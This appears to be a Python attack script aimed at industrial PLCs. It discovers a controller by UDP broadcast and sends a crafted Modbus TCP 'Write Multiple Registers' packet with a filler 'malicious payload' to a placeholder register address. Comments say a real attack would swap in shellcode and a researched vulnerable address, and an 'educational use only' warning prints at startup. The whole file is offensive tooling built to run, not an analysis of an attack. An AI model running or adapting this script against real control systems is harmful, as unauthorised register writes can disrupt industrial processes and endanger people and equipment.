import socket
import struct
import time

# --- Configuration ---
PLC_IP_ADDRESS = "192.168.9.24"  # Default IP, will try to discover if not responding
PLC_MODBUS_PORT = 502            # Standard Modbus port
VULNERABILITY_ADDRESS = 40001     # Example Modbus address to exploit.  This needs research.
                                    # THIS IS A PLACEHOLDER! You *MUST* find a real vulnerability address.
PAYLOAD_SIZE = 100             # Size of the malicious payload (bytes)
# --- End Configuration ---

def find_plc_ip(default_ip="192.168.9.24"):
    """Attempts to discover the PLC's IP address by sending a broadcast ping and listening for a response."""
    print("[*] Attempting to discover PLC IP address...")
    
    broadcast_address = '255.255.255.255' # Standard broadcast address.  Might need adjusted for the network
    broadcast_port = 30303 # Arbitrary port for broadcast communication
    
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(2) # Timeout after 2 seconds
    
    message = b"PLC_DISCOVERY_REQUEST" # Simple discovery message
    
    try:
        sock.sendto(message, (broadcast_address, broadcast_port))
        print("[+] Discovery message sent.")
        
        data, addr = sock.recvfrom(1024)
        
        if data.startswith(b"PLC_DISCOVERY_RESPONSE"):
            ip_address = addr[0]
            print(f"[+] PLC IP address found: {ip_address}")
            return ip_address
        else:
            print("[-] No valid discovery response received.")
            return default_ip # fall back to default.
    except socket.timeout:
        print("[-] Discovery timed out.  No response received.")
        return default_ip # Fall back to the default if discovery fails
    except Exception as e:
        print(f"[-] Error during discovery: {e}")
        return default_ip


def modbus_write_multiple_registers(ip_address, port, start_address, values):
    """Writes multiple registers using Modbus TCP."""

    # Craft the Modbus TCP PDU (Protocol Data Unit)
    function_code = 0x10  # Write Multiple Registers
    starting_address_bytes = struct.pack(">H", start_address)
    quantity_of_registers_bytes = struct.pack(">H", len(values))
    byte_count = len(values) * 2  # Each register is 2 bytes
    byte_count_bytes = struct.pack("B", byte_count)
    register_value_bytes = b"".join(struct.pack(">H", value) for value in values)

    pdu = (
        bytes([function_code])
        + starting_address_bytes
        + quantity_of_registers_bytes
        + byte_count_bytes
        + register_value_bytes
    )

    # Craft the Modbus TCP ADU (Application Data Unit)
    transaction_identifier = struct.pack(">H", 1)  # Arbitrary transaction ID
    protocol_identifier = struct.pack(">H", 0)  # Modbus TCP Protocol ID
    length = struct.pack(">H", len(pdu) + 1)  # Length of the remaining packet
    unit_identifier = struct.pack("B", 1)  # Slave address

    adu = transaction_identifier + protocol_identifier + length + unit_identifier + pdu

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip_address, port))
        sock.sendall(adu)

        response = sock.recv(1024)  # Receive response
        sock.close()

        # Process Response (Minimal error checking)
        if response:
            print("[+] Modbus write successful. Response:", response)
        else:
            print("[-] No response from Modbus server.")

    except socket.error as e:
        print(f"[-] Socket error: {e}")
        return False
    except Exception as e:
        print(f"[-] An error occurred: {e}")
        return False

    return True


def exploit_plc(plc_ip, vulnerability_address, payload):
    """Exploits a PLC vulnerability by writing a malicious payload to a specific memory address."""

    print(f"[*] Attempting to exploit PLC at {plc_ip} address: {vulnerability_address}...")

    # It's crucial to understand that this is a simplified example.
    # Real-world PLC exploitation requires deep knowledge of the target PLC,
    # its firmware, and specific vulnerabilities.

    # **IMPORTANT: This is just an example. You must adapt the payload based on your specific vulnerability**
    # The following assumes a vulnerability where writing to a Modbus register
    # allows overwriting adjacent memory. This is a common class of vulnerabilities.
    # In this simplified example, we'll just write a series of 'A's to the register.

    # Convert the payload to a list of 16-bit integers (Modbus registers).
    payload_registers = []
    for i in range(0, len(payload), 2):
        if i + 1 < len(payload):
            payload_registers.append((payload[i] << 8) | payload[i+1]) # Combine two bytes into a 16-bit word
        else:
            payload_registers.append(payload[i] << 8) # Pad with a zero byte if odd number of bytes

    print(f"[*] Sending malicious payload (size: {len(payload)} bytes)...")
    success = modbus_write_multiple_registers(plc_ip, PLC_MODBUS_PORT, vulnerability_address, payload_registers)

    if success:
        print("[+] Payload sent successfully (potentially).  Exploitation outcome is unknown.")
        print("[!] PLC may be unstable or compromised. Immediate isolation is recommended.")
    else:
        print("[-] Failed to send the payload.")


def main():
    """Main function to coordinate the exploit."""

    global PLC_IP_ADDRESS # Use the global variable, so we can modify it if needed.

    PLC_IP_ADDRESS = find_plc_ip(PLC_IP_ADDRESS) # Try to discover the ip address before moving forward.
    
    print(f"[*] Using PLC IP address: {PLC_IP_ADDRESS}")

    # 1. Craft the Malicious Payload
    # **This is the most important and complex part.  It NEEDS to be crafted
    # specifically for the vulnerability.**
    # In this example, we're generating a simple payload of 'A' characters.
    # In a real attack, this would be shellcode or other malicious instructions.
    payload = b"A" * PAYLOAD_SIZE

    # 2. Trigger the Exploit
    exploit_plc(PLC_IP_ADDRESS, VULNERABILITY_ADDRESS, payload)


if __name__ == "__main__":
    print("[*] Starting PLC Exploitation Script...")
    print("[!] WARNING: This script is for educational and ethical security testing purposes ONLY.")
    print("[!] Unauthorized use is illegal and potentially dangerous.")
    print("[!] Use at your own risk.")

    # Input from the user before proceeding (Optional)
    input("[?] Press Enter to continue with the exploitation (or Ctrl+C to abort)...")
    main()
    print("[*] Script execution completed.")